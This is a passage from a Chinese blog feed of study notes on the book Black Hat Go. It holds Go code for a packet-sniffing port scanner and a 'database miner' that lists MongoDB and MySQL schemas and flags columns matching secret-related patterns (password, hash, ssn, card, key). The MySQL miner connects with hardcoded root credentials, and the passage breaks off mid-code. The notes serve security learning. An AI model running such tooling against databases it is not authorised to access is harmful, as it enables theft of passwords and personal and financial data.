 results  = <span class="built_in">make</span>(<span class="keyword">map</span>[<span class="type">string</span>]<span class="type">int</span>)                                    <span class="comment">//结果存储映射</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="comment">/**** 接收要测试的接口名称和目标IP ****/</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">capture</span><span class="params">(iface, target <span class="type">string</span>)</span></span> &#123;</span><br><span class="line">   <span class="comment">/**** 创建一个*pcap.Handle，它允许我们读取和注入数据包  ****/</span></span><br><span class="line">   <span class="comment">/**** 使用这个handle，可以用一个BRF过滤器并创建一个新的包数据源，从中读取数据包  ****/</span></span><br><span class="line">   handle, err := pcap.OpenLive(iface, snaplen, promisc, timeout) <span class="comment">//1.创建一个*pcap.Handle</span></span><br><span class="line">   <span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">      log.Panicln(err)</span><br><span class="line">   &#125;</span><br><span class="line">   <span class="keyword">defer</span> handle.Close()</span><br><span class="line"></span><br><span class="line">   <span class="keyword">if</span> err := handle.SetBPFFilter(filter); err != <span class="literal">nil</span> &#123; <span class="comment">//2.为handle设置BRF过滤器</span></span><br><span class="line">      log.Panicln(err)</span><br><span class="line">   &#125;</span><br><span class="line"></span><br><span class="line">   source := gopacket.NewPacketSource(handle, handle.LinkType()) <span class="comment">//3.创建新的数据源</span></span><br><span class="line">   fmt.Println(<span class="string">&quot;Capturing packets&quot;</span>)</span><br><span class="line">   <span class="keyword">for</span> packet := <span class="keyword">range</span> source.Packets() &#123; <span class="comment">//4.读取数据包</span></span><br><span class="line">      networkLayer := packet.NetworkLayer() <span class="comment">//5.通过检查packet.NetworkLayer()的响应值来确定是否存在网络层</span></span><br><span class="line">      <span class="keyword">if</span> networkLayer == <span class="literal">nil</span> &#123;</span><br><span class="line">         <span class="keyword">continue</span></span><br><span class="line">      &#125;</span><br><span class="line">      transportLayer := packet.TransportLayer() <span class="comment">//5.通过检查packet.TransportLayer()的响应值来确定是否存在传输层</span></span><br><span class="line">      <span class="keyword">if</span> transportLayer == <span class="literal">nil</span> &#123;</span><br><span class="line">         <span class="keyword">continue</span></span><br><span class="line">      &#125;</span><br><span class="line">      <span class="comment">//如果上面两个层中有任何一个不存在，就忽略该数据包</span></span><br><span class="line">      <span class="comment">//这是因为没有传输层和网络层，下面的代码就不会拿到这些信息。</span></span><br><span class="line">      srcHost := networkLayer.NetworkFlow().Src().String()     <span class="comment">//ip</span></span><br><span class="line">      srcPort := transportLayer.TransportFlow().Src().String() <span class="comment">//port</span></span><br><span class="line"></span><br><span class="line">      <span class="keyword">if</span> srcHost != target &#123; <span class="comment">//6.判断是否命中目标</span></span><br><span class="line">         <span class="keyword">continue</span></span><br><span class="line">      &#125;</span><br><span class="line">      results[srcPort] += <span class="number">1</span> <span class="comment">//命中目标，增加端口开发的置信度级别</span></span><br><span class="line">   &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line"></span><br><span class="line">   <span class="keyword">if</span> <span class="built_in">len</span>(os.Args) != <span class="number">4</span> &#123; <span class="comment">//命令行参数</span></span><br><span class="line">      log.Fatalln(<span class="string">&quot;Usage: main.go &lt;capture_iface&gt; &lt;target_ip&gt; &lt;port1,port2,port3&gt;&quot;</span>)</span><br><span class="line">   &#125;</span><br><span class="line"></span><br><span class="line">   devices, err := pcap.FindAllDevs() <span class="comment">//1.查找所有设备</span></span><br><span class="line">   <span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">      log.Panicln(err)</span><br><span class="line">   &#125;</span><br><span class="line"></span><br><span class="line">   iface := os.Args[<span class="number">1</span>]              <span class="comment">//设备名称</span></span><br><span class="line">   <span class="keyword">for</span> _, device := <span class="keyword">range</span> devices &#123; <span class="comment">//2.检索所有设备</span></span><br><span class="line">      <span class="keyword">if</span> device.Name == iface &#123;</span><br><span class="line">         devFound = <span class="literal">true</span> <span class="comment">//找到了目标设备iface，devFound = true</span></span><br><span class="line">      &#125;</span><br><span class="line">   &#125;</span><br><span class="line">   <span class="keyword">if</span> !devFound &#123; <span class="comment">//没找到</span></span><br><span class="line">      log.Panicf(<span class="string">&quot;Device named &#x27;%s&#x27; does not exist\n&quot;</span>, iface)</span><br><span class="line">   &#125;</span><br><span class="line"></span><br><span class="line">   ip := os.Args[<span class="number">2</span>] <span class="comment">//目标ip</span></span><br><span class="line">   <span class="comment">/* 使用goroutine去报数据包捕获和处理逻辑并发运行，不会产生阻塞 */</span></span><br><span class="line">   <span class="keyword">go</span> capture(iface, ip)       <span class="comment">//3.接受要测试接口名称和目标IP</span></span><br><span class="line">   time.Sleep(<span class="number">1</span> * time.Second) <span class="comment">//延时，目的是确保留出足够多的时间设置嗅探器和处理数据包</span></span><br><span class="line"></span><br><span class="line">   ports, err := explode(os.Args[<span class="number">3</span>]) <span class="comment">//将命令行输入的端口放入数组</span></span><br><span class="line">   <span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">      log.Panicln(err)</span><br><span class="line">   &#125;</span><br><span class="line"></span><br><span class="line">   <span class="keyword">for</span> _, port := <span class="keyword">range</span> ports &#123; <span class="comment">//4.遍历所有端口</span></span><br><span class="line">      target := fmt.Sprintf(<span class="string">&quot;%s:%s&quot;</span>, ip, port)</span><br><span class="line">      fmt.Println(<span class="string">&quot;Trying&quot;</span>, target)</span><br><span class="line">      c, err := net.DialTimeout(<span class="string">&quot;tcp&quot;</span>, target, <span class="number">1000</span>*time.Millisecond) <span class="comment">//连接测试</span></span><br><span class="line">      <span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">         <span class="keyword">continue</span></span><br><span class="line">      &#125;</span><br><span class="line">      c.Close() <span class="comment">//tcp连接后要断开</span></span><br><span class="line">   &#125;</span><br><span class="line">   <span class="comment">/*time.Sleep()的多次调用：目的是确保留出足够多的时间设置嗅探器和处理数据包*/</span></span><br><span class="line">   time.Sleep(<span class="number">2</span> * time.Second) <span class="comment">//延时，目的是确保留出足够多的时间设置嗅探器和处理数据包</span></span><br><span class="line"></span><br><span class="line">   <span class="comment">/* 尝试李连杰每个端口后，仅显示置信度&gt;=1的端口。这意味着至少一个数据包与该端口的过滤器匹配 */</span></span><br><span class="line">   <span class="keyword">for</span> port, confidence := <span class="keyword">range</span> results &#123; <span class="comment">//</span></span><br><span class="line">      <span class="keyword">if</span> confidence &gt;= <span class="number">1</span> &#123;</span><br><span class="line">         fmt.Printf(<span class="string">&quot;Port %s open (confidence: %d)\n&quot;</span>, port, confidence)</span><br><span class="line">      &#125;</span><br><span class="line">   &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">explode</span><span class="params">(portString <span class="type">string</span>)</span></span> ([]<span class="type">string</span>, <span class="type">error</span>) &#123;</span><br><span class="line">   ret := <span class="built_in">make</span>([]<span class="type">string</span>, <span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">   ports := strings.Split(portString, <span class="string">&quot;,&quot;</span>)</span><br><span class="line">   <span class="keyword">for</span> _, port := <span class="keyword">range</span> ports &#123;</span><br><span class="line">      port := strings.TrimSpace(port)</span><br><span class="line">      ret = <span class="built_in">append</span>(ret, port)</span><br><span class="line">   &#125;</span><br><span class="line"></span><br><span class="line">   <span class="keyword">return</span> ret, <span class="literal">nil</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>结果如下：这里我引用了书中的运行结果和需要改进的地方；提醒自己空闲时间去改进一下。</p><p><img src="https://cdn.jsdelivr.net/gh/Azh3n/blog-img/image-20230201121149796.png" alt="image-20230201121149796"></p>]]></content>
      
      
      <categories>
          
          <category> Go渗透编程 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 安全开发 </tag>
            
            <tag> Go </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>7.2数据库矿工</title>
      <link href="/2023/02/01/Go/Go%E6%B8%97%E9%80%8F%E7%BC%96%E7%A8%8B/7.2%E6%95%B0%E6%8D%AE%E5%BA%93%E7%9F%BF%E5%B7%A5/"/>
      <url>/2023/02/01/Go/Go%E6%B8%97%E9%80%8F%E7%BC%96%E7%A8%8B/7.2%E6%95%B0%E6%8D%AE%E5%BA%93%E7%9F%BF%E5%B7%A5/</url>
      
        <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><ul><li>假设攻击者想要查找密码、散列值、社会保险号和信用卡号。</li><li>与其构建一个挖掘各种后端数据库的单一实用程序</li><li>不如为每个数据库创建一个单独的使用程序。并实现一个定义好的接口，以确保实现之间的一致性</li><li>对于本例而言，这种灵活性可能很难达到，但我们可以重用和代码移植</li></ul><h4 id="1-首先实现一个接口-dbminer-go"><a href="#1-首先实现一个接口-dbminer-go" class="headerlink" title="1. 首先实现一个接口(dbminer.go)"></a>1. 首先实现一个接口(dbminer.go)</h4><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> (</span><br><span class="line"><span class="string">&quot;fmt&quot;</span></span><br><span class="line"><span class="string">&quot;regexp&quot;</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="keyword">type</span> DatabaseMiner <span class="keyword">interface</span> &#123;  <span class="comment">//定义接口DatabaseMiner</span></span><br><span class="line">GetSchema() (*Schema, <span class="type">error</span>)   <span class="comment">//接口方法，不同数据库有不同的检索模式</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">type</span> Schema <span class="keyword">struct</span> &#123;   <span class="comment">//库集</span></span><br><span class="line">Databases []Database   <span class="comment">//定义一个数据库类型Database。该类型由子类型构成</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">type</span> Database <span class="keyword">struct</span> &#123;  <span class="comment">//表集</span></span><br><span class="line">Name   <span class="type">string</span></span><br><span class="line">Tables []Table</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">type</span> Table <span class="keyword">struct</span> &#123;  <span class="comment">//列集</span></span><br><span class="line">Name    <span class="type">string</span></span><br><span class="line">Columns []<span class="type">string</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">Search</span><span class="params">(m DatabaseMiner)</span></span> <span class="type">error</span> &#123;    <span class="comment">//关键逻辑</span></span><br><span class="line">    s, err := m.GetSchema()     <span class="comment">//检索模式(遍历)</span></span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line"><span class="keyword">return</span> err</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">re := getRegex()   <span class="comment">//正则表达式</span></span><br><span class="line"><span class="keyword">for</span> _, database := <span class="keyword">range</span> s.Databases &#123;  <span class="comment">//开始检索</span></span><br><span class="line"><span class="keyword">for</span> _, table := <span class="keyword">range</span> database.Tables &#123;</span><br><span class="line"><span class="keyword">for</span> _, value := <span class="keyword">range</span> table.Columns &#123; <span class="comment">//取字段数据</span></span><br><span class="line"><span class="keyword">for</span> _, r := <span class="keyword">range</span> re &#123;   <span class="comment">//遍历取出re中的数据</span></span><br><span class="line"><span class="keyword">if</span> r.MatchString(value) &#123;  <span class="comment">//比较值</span></span><br><span class="line">fmt.Println(database)</span><br><span class="line">fmt.Printf(<span class="string">&quot;[+] HIT: %s\n&quot;</span>, value)</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> <span class="literal">nil</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">getRegex</span><span class="params">()</span></span> []*regexp.Regexp &#123;  <span class="comment">//正则，且不区分大小写</span></span><br><span class="line"><span class="keyword">return</span> []*regexp.Regexp&#123;</span><br><span class="line">regexp.MustCompile(<span class="string">`(?i)social`</span>),  </span><br><span class="line">regexp.MustCompile(<span class="string">`(?i)ssn`</span>),</span><br><span class="line">regexp.MustCompile(<span class="string">`(?i)pass(word)?`</span>),</span><br><span class="line">regexp.MustCompile(<span class="string">`(?i)hash`</span>),</span><br><span class="line">regexp.MustCompile(<span class="string">`(?i)ccnum`</span>),</span><br><span class="line">regexp.MustCompile(<span class="string">`(?i)card`</span>),</span><br><span class="line">regexp.MustCompile(<span class="string">`(?i)security`</span>),</span><br><span class="line">regexp.MustCompile(<span class="string">`(?i)key`</span>),</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(s Schema)</span></span> String() <span class="type">string</span> &#123;</span><br><span class="line"><span class="keyword">var</span> ret <span class="type">string</span></span><br><span class="line"><span class="keyword">for</span> _, database := <span class="keyword">range</span> s.Databases &#123;</span><br><span class="line">ret += fmt.Sprint(database.String() + <span class="string">&quot;\n&quot;</span>)</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> ret</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(d Database)</span></span> String() <span class="type">string</span> &#123;</span><br><span class="line">ret := fmt.Sprintf(<span class="string">&quot;[DB] = %+s\n&quot;</span>, d.Name)</span><br><span class="line"><span class="keyword">for</span> _, table := <span class="keyword">range</span> d.Tables &#123;</span><br><span class="line">ret += table.String()</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> ret</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(t Table)</span></span> String() <span class="type">string</span> &#123;</span><br><span class="line">ret := fmt.Sprintf(<span class="string">&quot;    [TABLE] = %+s\n&quot;</span>, t.Name)</span><br><span class="line"><span class="keyword">for</span> _, field := <span class="keyword">range</span> t.Columns &#123;</span><br><span class="line">ret += fmt.Sprintf(<span class="string">&quot;       [COL] = %+s\n&quot;</span>, field)</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> ret</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="2-实现一个MongoDB数据库矿工"><a href="#2-实现一个MongoDB数据库矿工" class="headerlink" title="2.实现一个MongoDB数据库矿工"></a>2.实现一个MongoDB数据库矿工</h4><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> (</span><br><span class="line">   <span class="string">&quot;github.com/blackhat-go/bhg/ch-7/db/dbminer&quot;</span> <span class="comment">//接口</span></span><br><span class="line">   <span class="string">&quot;gopkg.in/mgo.v2&quot;</span></span><br><span class="line">   <span class="string">&quot;gopkg.in/mgo.v2/bson&quot;</span></span><br><span class="line">   <span class="string">&quot;os&quot;</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="keyword">type</span> MongoMiner <span class="keyword">struct</span> &#123; <span class="comment">//MongoMiner结构体</span></span><br><span class="line">   Host    <span class="type">string</span></span><br><span class="line">   session *mgo.Session</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*******New()实现新实例的创建******/</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">New</span><span class="params">(host <span class="type">string</span>)</span></span> (*MongoMiner, <span class="type">error</span>) &#123;</span><br><span class="line">   m := MongoMiner&#123;Host: host&#125;</span><br><span class="line">   err := m.connect()</span><br><span class="line">   <span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">      <span class="keyword">return</span> <span class="literal">nil</span>, err</span><br><span class="line">   &#125;</span><br><span class="line">   <span class="keyword">return</span> &amp;m, <span class="literal">nil</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(m *MongoMiner)</span></span> connect() <span class="type">error</span> &#123; <span class="comment">//数据库连接函数</span></span><br><span class="line">   s, err := mgo.Dial(m.Host)</span><br><span class="line">   <span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">      <span class="keyword">return</span> err</span><br><span class="line">   &#125;</span><br><span class="line">   m.session = s</span><br><span class="line">   <span class="keyword">return</span> <span class="literal">nil</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*******接口函数GetSchema()的实现***********/</span></span><br><span class="line"><span class="comment">//实现拿取MongoDB的数据库结构</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(m *MongoMiner)</span></span> GetSchema() (*dbminer.Schema, <span class="type">error</span>) &#123;</span><br><span class="line">   <span class="keyword">var</span> s = <span class="built_in">new</span>(dbminer.Schema)</span><br><span class="line"></span><br><span class="line">   dbnames, err := m.session.DatabaseNames() <span class="comment">//首席按检索库集</span></span><br><span class="line">   <span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">      <span class="keyword">return</span> <span class="literal">nil</span>, err</span><br><span class="line">   &#125;</span><br><span class="line"></span><br><span class="line">   <span class="keyword">for</span> _, dbname := <span class="keyword">range</span> dbnames &#123; <span class="comment">//遍历库集</span></span><br><span class="line">      db := dbminer.Database&#123;Name: dbname, Tables: []dbminer.Table&#123;&#125;&#125;</span><br><span class="line">      collections, err := m.session.DB(dbname).CollectionNames()</span><br><span class="line">      <span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">         <span class="keyword">return</span> <span class="literal">nil</span>, err</span><br><span class="line">      &#125;</span><br><span class="line"></span><br><span class="line">      <span class="keyword">for</span> _, collection := <span class="keyword">range</span> collections &#123; <span class="comment">//检索集合名称</span></span><br><span class="line">         table := dbminer.Table&#123;Name: collection, Columns: []<span class="type">string</span>&#123;&#125;&#125;</span><br><span class="line"></span><br><span class="line">         <span class="keyword">var</span> docRaw bson.Raw  <span class="comment">//该文档与典型的MongoDB查询不同，它使用了懒散反序列化</span></span><br><span class="line">         err := m.session.DB(dbname).C(collection).Find(<span class="literal">nil</span>).One(&amp;docRaw)</span><br><span class="line">         <span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">nil</span>, err</span><br><span class="line">         &#125;</span><br><span class="line"></span><br><span class="line">         <span class="keyword">var</span> doc bson.RawD</span><br><span class="line">         <span class="keyword">if</span> err := docRaw.Unmarshal(&amp;doc); err != <span class="literal">nil</span> &#123;</span><br><span class="line">            <span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">               <span class="keyword">return</span> <span class="literal">nil</span>, err</span><br><span class="line">            &#125;</span><br><span class="line">         &#125;</span><br><span class="line"></span><br><span class="line">         <span class="keyword">for</span> _, f := <span class="keyword">range</span> doc &#123; <span class="comment">//检索原始文档</span></span><br><span class="line">            table.Columns = <span class="built_in">append</span>(table.Columns, f.Name)</span><br><span class="line">         &#125;</span><br><span class="line">         db.Tables = <span class="built_in">append</span>(db.Tables, table) <span class="comment">//收集表</span></span><br><span class="line">      &#125;</span><br><span class="line">      s.Databases = <span class="built_in">append</span>(s.Databases, db) <span class="comment">//收集库</span></span><br><span class="line">   &#125;</span><br><span class="line">   <span class="keyword">return</span> s, <span class="literal">nil</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">   mm, err := New(os.Args[<span class="number">1</span>]) <span class="comment">//传递数据库的IP地址</span></span><br><span class="line">   <span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">      <span class="built_in">panic</span>(err)</span><br><span class="line">   &#125;</span><br><span class="line">   <span class="keyword">if</span> err := dbminer.Search(mm); err != <span class="literal">nil</span> &#123; <span class="comment">//调用包内方法</span></span><br><span class="line">      <span class="built_in">panic</span>(err)</span><br><span class="line">   &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/Azh3n/blog-img/image-20230131134821130.png" alt="image-20230131134821130"></p><h4 id="3-实现一个MySQL数据库矿工"><a href="#3-实现一个MySQL数据库矿工" class="headerlink" title="3.实现一个MySQL数据库矿工"></a>3.实现一个MySQL数据库矿工</h4><ul><li><p>目标是检查schema.columns信息，该表维护MySQL的所有元数据。</p></li><li><p>建议使用以下SQL查询语句，删除一些内置MySQL数据库的信息(这些信息对掠夺没有任何影响)</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> table_schema, table_name, column_name <span class="keyword">from</span> columns <span class="keyword">where</span> table_schema <span class="keyword">not</span> <span class="keyword">in</span> (<span class="string">&#x27;mysql&#x27;</span>, <span class="string">&#x27;information_schema&#x27;</span>, <span class="string">&#x27;performance_schema&#x27;</span>, <span class="string">&#x27;sys&#x27;</span>) <span class="keyword">order</span> <span class="keyword">by</span> table_schema, table_name</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/Azh3n/blog-img/image-20230131141400135.png" alt="image-20230131141400135"></p></li><li><p>尽管MySQL的查询检索模式信息很简单。</p></li><li><p>但代码的复杂性来自于定义函数GetSchema()时，逻辑上会尝试区分和分类每一行。</p></li><li><p>比如说：输出的连续行可能属于或不属于同一数据库或表，因此将这些行与正确的dbminer.Database和dbminer.Table实例相关联变得有些棘手</p></li><li><p>但我们可以维护变量来跟踪当前行中的信息，并将其与上一行中的数据进行比较，以确定是否遇到了新的数据库或表。这不是最优雅的解决方案，但可以完成工作。</p></li></ul><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> (</span><br><span class="line">   <span class="string">&quot;database/sql&quot;</span></span><br><span class="line">   <span class="string">&quot;fmt&quot;</span></span><br><span class="line">   <span class="string">&quot;log&quot;</span></span><br><span class="line">   <span class="string">&quot;os&quot;</span></span><br><span class="line">   <span class="string">&quot;github.com/blackhat-go/bhg/ch-7/db/dbminer&quot;</span></span><br><span class="line">   _ <span class="string">&quot;github.com/go-sql-driver/mysql&quot;</span></span><br><span class="line">)</span><br><span class="line"><span class="keyword">type</span> MySQLMiner <span class="keyword">struct</span> &#123;</span><br><span class="line">   Host <span class="type">string</span></span><br><span class="line">   Db   sql.DB</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">/*******New()实现新实例的创建******/</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">New</span><span class="params">(host <span class="type">string</span>)</span></span> (*MySQLMiner, <span class="type">error</span>) &#123;</span><br><span class="line">   m := MySQLMiner&#123;Host: host&#125;</span><br><span class="line">   err := m.connect()</span><br><span class="line">   <span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">      <span class="keyword">return</span> <span class="literal">nil</span>, err</span><br><span class="line">   &#125;</span><br><span class="line">   <span class="keyword">return</span> &amp;m, <span class="literal">nil</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(m *MySQLMiner)</span></span> connect() <span class="type">error</span> &#123; <span class="comment">//Mysql连接</span></span><br><span class="line"></span><br><span class="line">   db, err := sql.Open(<span class="string">&quot;mysql&quot;</span>, fmt.Sprintf(<span class="string">&quot;root:password@tcp(%s:3306)/information_schema&quot;</span>, m.Host))</span><br><span class="line">   <span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">      log.Panicln(err)</span><br><span class="line">   &#125;</span><br><span class="line">   m.Db = *db</span><br><span class="line">   <span class="keyword">return</span> <span class="literal">nil</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(m *MySQLMiner)</span></span> GetSchema() (*dbminer.Schema, <span class="type">error</span>) &#123;</span><br><span class="line">   <span class="keyword">var</span> s = <span class="built_in">new</span>(dbminer.Schema)</span><br><span class="line"></span><br><span class="line">   sql := <span class="string">`SELECT 